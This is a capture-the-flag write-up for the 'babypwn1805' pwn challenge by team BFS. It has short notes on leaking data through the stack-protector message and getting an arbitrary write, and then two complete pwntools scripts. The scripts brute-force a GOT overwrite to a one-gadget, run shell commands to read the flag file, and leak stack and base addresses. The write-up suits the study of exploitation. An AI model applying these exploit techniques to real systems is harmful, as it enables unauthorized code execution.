# babypwn1805 - pwn
## Team: BFS
## Ranking: 22
* Overwrite the pointer of program name, and trigger `SSP` -> leak information.
* Get serveral `libc`.
```
/opt/ctf/babypwn/bin/libs/libc-8548e4731a83e6ed3fc167633d28c21f.so
/babypwn/bin/libs/libc-61f5a3ac836ded55a092041ff497d7fa.so
/babypwn/bin/libs/libc-e9010796528c812dfe1d0c527b07110f.so
```
```c
    char asdf[1024];
    long long index = 0;
    read(0, asdf+index, 8);
```
* `asdf+index` -> write everywhere.
* Overwite `GOT read` with `onegadget` -> with probability 1/16 (correct libc).
* `/opt/ctf/babypwn/home/flag`.
```python
#!/usr/bin/env python
from pwn import *
import sys
import struct
import hashlib
import random
from threading import Timer

# OOO{to_know_the_libc_you_must_become_the_libc}

def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1


def hit():
    cmd = 'id;LD_PRELOAD='';'
    cmd += 'cat /opt/ctf/babypwn/home/flag;'
    cmd += 'ls -al /opt/ctf/babypwn/home/;'
    y.sendline( cmd )
    print y.recv( 2048 )


host , port = 'e4771e24.quals2018.oooverflow.io' , 31337
y = remote( host , port )

y.recvuntil( ': ' )
challenge = y.recvline().strip()
y.recvuntil( ': ' )
n = int( y.recvline() )
y.sendlineafter( ':' , str( solve_pow(challenge, n) ) )

success( 'Go' )

t = 0.3
y.recvuntil( 'Go\n' )

for i in xrange( 0x10000 ):
    y.send( p64( 0xffffffffffffffc8 ) )
    p = 0xae77
    y.send( p16( p ) )
    t = Timer(1.0, hit)
    t.start()
    y.recvuntil( 'Go' , timeout=1 )
    t.cancel()
```
* leak.py:
```python
#!/usr/bin/env python
from pwn import *
import sys
import struct
import hashlib
import random


def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1


host , port = 'e4771e24.quals2018.oooverflow.io' , 31337

y = remote( host , port )

y.recvuntil( ': ' )
challenge = y.recvline().strip()
y.recvuntil( ': ' )
n = int( y.recvline() )

y.sendlineafter( ':' , str( solve_pow(challenge, n) ) )

l = 0

info( 'find stable offset' )

for i in xrange( 0x10000 ):

    y.recvuntil( 'Go' )
    y.send( p64( 0 ) )
    y.send( p64( 0 ) )
    y.send( '\x00' * 0x50 + p64( 0 ) * i + '\x00'  )
    y.recvline()
    o = y.recvline()
    if 'baby' not in o:
        l = i * 8 + 0x50
        break

success( 'offset -> %s' % hex( l ) )

base = 0

info( 'Leak stack' )

for i in xrange( 0x10000 ):

    y.recvuntil( 'Go' )
    y.send( p64( 0 ) )
    y.send( p64( 0 ) )
    r = random.randint( 0 , 0xffff ) & 0xfff0
    y.send( '\x00' * l + p16( r ) )
    y.recvline()
    o = y.recvline()
    try:
        leak = u64( o[o.find('***: ') + 5 : o.find(' ter') ].ljust( 8 , '\x00' ) )
    except:
        pass
    success( '%s -> %s' % ( hex( r ) , hex( leak ) ) )
    if leak & 0xff0000000000 == 0x55:
        base = leak & 0xffffffffff00
        break


    y.recvuntil( 'Go' )
    y.send( p64( 0 ) )
    y.send( p64( 0 ) )
    r = random.randint( 0 , 0xffff ) & 0xfff0 + 8
    y.send( '\x00' * l + p16( r )  )
    y.recvline()
    o = y.recvline()
    try:
        leak = u64( o[o.find('***: ') + 5 : o.find(' ter') ].ljust( 8 , '\x00' ) )
    except:
        pass
    success( '%s -> %s' % ( hex( r ) , hex( leak ) ) )
    if leak & 0xff0000000000 == 0x55:
        base = leak & 0xffffffffff00
        break




y.interactive()
```